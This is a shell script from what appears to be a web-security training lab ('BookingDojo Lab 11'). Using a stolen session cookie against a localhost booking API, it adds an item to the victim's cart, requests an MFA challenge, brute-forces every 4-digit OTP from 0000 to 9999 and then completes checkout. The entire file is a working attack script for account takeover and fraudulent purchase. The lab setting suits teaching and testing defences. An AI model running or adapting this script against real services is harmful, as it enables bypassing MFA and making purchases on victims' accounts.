#!/bin/sh
# brute_force_otp_and_checkout.sh — BookingDojo Lab 11
# Simulates an attacker who has stolen a session cookie:
#   1. Adds a hotel booking to the victim's cart
#   2. Brute-forces the MFA OTP (0000–9999)
#   3. Completes checkout once the session is MFA-stamped
COOKIES="$1"
BFF="http://localhost:5001"

if [ -z "$COOKIES" ]; then
  echo "Usage: $0 <cookie-file>"
  exit 1
fi

# Step 1 — seed the cart (attacker picks an available hotel)
echo "Adding item to cart…"
HOTEL_ID=$(curl -s -b "$COOKIES" "$BFF/bff/hotels/available" \
  | grep -o '"id":"[^"]*"' | head -1 | cut -d'"' -f4)

if [ -z "$HOTEL_ID" ]; then
  echo "No available hotels found — is the API running?"
  exit 1
fi

ADD_STATUS=$(curl -s -o /dev/null -w '%{http_code}' \
  -X POST "$BFF/bff/cart/items" \
  -b "$COOKIES" \
  -H "Content-Type: application/json" \
  -d "{\"hotelId\":\"$HOTEL_ID\",\"checkIn\":\"2026-08-01\",\"checkOut\":\"2026-08-03\",\"cardNumber\":\"4111111111111111\",\"specialRequests\":\"\"}")

if [ "$ADD_STATUS" != "200" ] && [ "$ADD_STATUS" != "201" ]; then
  echo "Failed to add cart item (HTTP $ADD_STATUS)"
  exit 1
fi
echo "Cart item added (hotel $HOTEL_ID)."

# Step 2 — confirm checkout is blocked without MFA
echo "Confirming checkout requires MFA…"
MFA_CHECK=$(curl -s -o /dev/null -w '%{http_code}' \
  -X POST "$BFF/bff/cart/checkout" \
  -b "$COOKIES" \
  -H "Content-Type: application/json" \
  -d '{}')
if [ "$MFA_CHECK" != "403" ]; then
  echo "Unexpected status $MFA_CHECK — expected 403 requiresMfa"
  exit 1
fi
echo "Confirmed: checkout blocked (403). Starting brute force…"

# Step 3 — request a fresh OTP challenge
curl -s -X POST "$BFF/bff/auth/mfa/challenge" \
  -b "$COOKIES" > /dev/null

# Step 4 — enumerate all 4-digit codes
echo "Brute-forcing OTP (0000–9999)…"
i=0
while [ "$i" -le 9999 ]; do
  CODE=$(printf '%04d' "$i")
  STATUS=$(curl -s -o /dev/null -w '%{http_code}' \
    -X POST "$BFF/bff/auth/mfa/verify" \
    -b "$COOKIES" -c "$COOKIES" \
    -H "Content-Type: application/json" \
    -d "{\"code\":\"$CODE\"}")
  if [ "$STATUS" = "200" ]; then
    echo "Found OTP: $CODE (after $i attempts)"
    echo "Attempting checkout…"
    curl -s -b "$COOKIES" -X POST "$BFF/bff/cart/checkout" \
      -H "Content-Type: application/json" \
      -d '{}' | jq .
    exit 0
  fi
  i=$(( i + 1 ))
done

echo "Not found — challenge may have expired."
